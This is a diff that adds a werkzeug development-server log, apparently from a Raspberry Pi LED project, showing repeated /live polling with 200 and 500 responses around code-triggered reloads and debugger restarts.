+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:59:33] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:59:38] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:59:43] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:59:47] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:59:52] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 00:59:57] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:00:02] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:00:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:00:13] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:00:18] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:00:23] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:00:27] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:00:32] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:00:37] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:00:42] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:00:48] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:00:53] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:00:58] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:01:03] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:01:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/led.py', reloading
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:01:13] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:01:17] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:01:22] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:01:27] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:01:32] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:01:38] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:01:43] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.236.144.126 - - [24/Oct/2021 01:01:48] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
